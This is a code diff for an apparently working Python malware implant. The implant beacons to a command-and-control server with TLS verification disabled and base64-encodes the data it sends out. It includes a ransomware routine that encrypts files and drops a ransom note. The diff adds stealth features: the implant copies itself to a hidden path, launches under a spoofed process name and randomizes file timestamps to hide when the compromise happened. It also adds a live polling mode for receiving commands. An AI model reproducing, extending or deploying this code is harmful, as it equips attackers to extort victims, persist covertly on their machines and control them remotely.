@@ -11,6 +11,10 @@ from Crypto.Cipher import AES
 
 import requests
 
+# For use where no verified domain is available for C2
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
 try:
 	import pwd
 except ModuleNotFoundError:
@@ -42,7 +46,7 @@ def make_get(url):
 
 	"""
 	try:
-		r = requests.get(f"http://{HOST}:{PORT}/{url}")
+		r = requests.get(f"https://{HOST}:{PORT}/{url}", verify=False)
 	except ConnectionRefusedError:
 		return 400
 	return base64.urlsafe_b64decode(bytes(r.text.encode('utf-8'))).decode('utf-8')
@@ -59,7 +63,7 @@ def make_post(url, data):
 
 	"""
 	data = base64.urlsafe_b64encode(bytes(data.encode('utf-8')))
-	r = requests.post(f"http://{HOST}:{PORT}/{url}", data=data)
+	r = requests.post(f"https://{HOST}:{PORT}/{url}", data=data, verify=False)
 	return r.status_code
 
 
@@ -329,7 +333,7 @@ def execute_ransom(key):
 
 		q.join()
 
-		with open(f"{os.path.expanduser("~")}/ransom.txt") as f:
+		with open(f"{os.path.expanduser('~')}/ransom.txt") as f:
 			# TODO: ransom note technique here
 			f.write("NOTE")
 
@@ -355,10 +359,11 @@ def become_silent():
 	if not presence("CHECK") and cmdline != hidden:
 		presence("LEAVE")
 		print("No presence detected, going in...")
+		# Copy self to hidden location
 		shutil.copyfile(cmdline, hidden)
-		subprocess.run(["/bin/chmod", "+x", f"{hidden}"])
+		# make that file executable
 		subprocess.run(shlex.split(f"bash -c \"exec -a {bandit} {sys.executable} {hidden} &\""))
-		subprocess.run(["/bin/chmod", "-x", f"{hidden}"])
+		# change the file timestamp to obfuscate compromise time
 		randomize_timestamp(hidden)
 		print("Killing overt agent...")
 		exit(0)
@@ -411,17 +416,20 @@ def presence(mode):
 		randomize_timestamp(touch)
 		os.environ[env] = "1"
 		return True
-	elif mode == "CHECK":
+	elif mode == "CHECK" and debug == False:
 		if os.path.isfile(touch):
 			return True
-		if os.environ[env] == "1":
+		if env in os.environ and os.environ[env] == "1":
 			return True
+		return False
+	else:
 		return False
 
 
 def delay_for_mode(mode):
 	"""
 	Generate delay appropriate to mode
+	Live - 2 Seconds, intended for interactive mode
 	Active - 30 seconds
 	Passive - between 6 and 18 hours
 	Args:
@@ -432,7 +440,10 @@ def delay_for_mode(mode):
 	"""
 	if mode == "active":
 		delay = 30
+	elif mode == "live":
+		delay = 2
 	else:
+		# Passive
 		delay = random.randrange(21600, 64800)
 	print(f"Delaying for {delay}s...")
 	time.sleep(delay)
@@ -440,13 +451,6 @@ def delay_for_mode(mode):
 
 
 if __name__ == "__main__":
-
-	if debug:
-		try:
-			os.remove(f"{str(pathlib.Path.home())}/.zshconf")
-			os.environ["BASH"] = "0"
-		except FileNotFoundError:
-			pass
 	upgrade_shell()
 	become_silent()
 
@@ -455,6 +459,7 @@ if __name__ == "__main__":
 
 	last_commands = ""
 
+	# Core Loop 
 	while 1:
 		active, cmds = request_commands()
 
